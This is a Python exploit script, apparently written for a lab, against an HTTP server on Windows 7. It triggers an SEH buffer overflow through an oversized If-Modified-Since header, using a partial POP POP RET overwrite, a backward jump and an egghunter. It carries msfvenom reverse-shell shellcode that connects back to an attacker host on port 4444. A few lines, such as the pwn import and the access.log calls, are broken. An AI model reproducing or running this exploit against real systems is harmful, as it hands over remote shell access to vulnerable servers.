#!/usr/bin/python
#
# September 2st, 2019 | https://github.io/nu11pwned
# Author : Nu11pwn
# Development tools used
#	- Python, msf pattern create/offset
#	- Immunity debugger / mona.py
# Sytems used
# 	- Attacker / host system : Ubuntu 
#	- Victim system / Windows 7 sp1
# This was a  SEH (Structured exception handler) exploit which 
# required a POP POP RET sequence, a short jump, and a egghunter to trigger
# shellcode to obtain a shell on the victim testing system.
# Issues faced: 
#	POP POP RET had a bad byte, so we needed a partial SEH overwrite


import socket
from pwn import #

victim_host = "10.0.0.213"
victim_port = 80

# SEH handler overwritten - 41346741
# [*] Exact match at offset 192
# 0x0044D9C4 : POP POP RET - Has nullbyte so partial overwrite

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -f python -a x86 -b '\x00\x0a\x0c\x0d' -v shellcode -f python 

shellcode =  ""
shellcode += "\xbb\x4a\xa4\xa4\x1b\xda\xdc\xd9\x74\x24\xf4\x5a"
shellcode += "\x31\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04\x03\x10"
shellcode += "\xaa\x46\xee\x58\x5a\x04\x11\xa0\x9b\x69\x9b\x45"
shellcode += "\xaa\xa9\xff\x0e\x9d\x19\x8b\x42\x12\xd1\xd9\x76"
shellcode += "\xa1\x97\xf5\x79\x02\x1d\x20\xb4\x93\x0e\x10\xd7"
shellcode += "\x17\x4d\x45\x37\x29\x9e\x98\x36\x6e\xc3\x51\x6a"
shellcode += "\x27\x8f\xc4\x9a\x4c\xc5\xd4\x11\x1e\xcb\x5c\xc6"
shellcode += "\xd7\xea\x4d\x59\x63\xb5\x4d\x58\xa0\xcd\xc7\x42"
shellcode += "\xa5\xe8\x9e\xf9\x1d\x86\x20\x2b\x6c\x67\x8e\x12"
shellcode += "\x40\x9a\xce\x53\x67\x45\xa5\xad\x9b\xf8\xbe\x6a"
shellcode += "\xe1\x26\x4a\x68\x41\xac\xec\x54\x73\x61\x6a\x1f"
shellcode += "\x7f\xce\xf8\x47\x9c\xd1\x2d\xfc\x98\x5a\xd0\xd2"
shellcode += "\x28\x18\xf7\xf6\x71\xfa\x96\xaf\xdf\xad\xa7\xaf"
shellcode += "\xbf\x12\x02\xa4\x52\x46\x3f\xe7\x3a\xab\x72\x17"
shellcode += "\xbb\xa3\x05\x64\x89\x6c\xbe\xe2\xa1\xe5\x18\xf5"
shellcode += "\xc6\xdf\xdd\x69\x39\xe0\x1d\xa0\xfe\xb4\x4d\xda"
shellcode += "\xd7\xb4\x05\x1a\xd7\x60\x89\x4a\x77\xdb\x6a\x3a"
shellcode += "\x37\x8b\x02\x50\xb8\xf4\x33\x5b\x12\x9d\xde\xa6"
shellcode += "\xf5\xa8\x1e\xa8\x4b\xc5\x1c\xa8\x42\x49\xa8\x4e"
shellcode += "\x0e\x61\xfc\xd9\xa7\x18\xa5\x91\x56\xe4\x73\xdc"
shellcode += "\x59\x6e\x70\x21\x17\x87\xfd\x31\xc0\x67\x48\x6b"
shellcode += "\x47\x77\x66\x03\x0b\xea\xed\xd3\x42\x17\xba\x84"
shellcode += "\x03\xe9\xb3\x40\xbe\x50\x6a\x76\x43\x04\x55\x32"
shellcode += "\x98\xf5\x58\xbb\x6d\x41\x7f\xab\xab\x4a\x3b\x9f"
shellcode += "\x63\x1d\x95\x49\xc2\xf7\x57\x23\x9c\xa4\x31\xa3"
shellcode += "\x59\x87\x81\xb5\x65\xc2\x77\x59\xd7\xbb\xc1\x66"
shellcode += "\xd8\x2b\xc6\x1f\x04\xcc\x29\xca\x8c\xf2\xd8\xc6"
shellcode += "\x18\x62\x43\xb3\x60\xee\x74\x6e\xa6\x17\xf7\x9a"
shellcode += "\x57\xec\xe7\xef\x52\xa8\xaf\x1c\x2f\xa1\x45\x22"
shellcode += "\x9c\xc2\x4f"

seh = "\xC4\xD9\x44" # partial pop pop ret overwrite
nseh = "\xEB\xC4\x90\x90"

egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# !mona egg -t w00t - 32 bytes

exploit_payload  = "A" * (188 - 32)
exploit_payload += egghunter
exploit_payload += "A" * (300-len(exploit_payload))
exploit_payload += nseh
exploit_payload += seh

http_request  = "GET / HTTP/1.1\r\n"
http_request += "Host: \r\n"
http_request += "User-Agent: " + "w00tw00t" + "\x90" * 16 + shellcode + "\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Connection: close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"
http_request += "If-Modified-Since: Wed, " + exploit_payload + "\r\n\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, victim_port))

expl.send(http_request)

access.log("[!] You may need to send it mutiple times")
access.log("Sending malicious HTTP GET request")
access.log("Sending filled buffed (188 bytes)")
access.log("Sending egghunter (32 bytes)")
access.log("Sending NSEH with backwards JMP (up 80 bytes)")
access.log("Sending SEH with POP POP RET (partial overwrite) ")
expl.close()
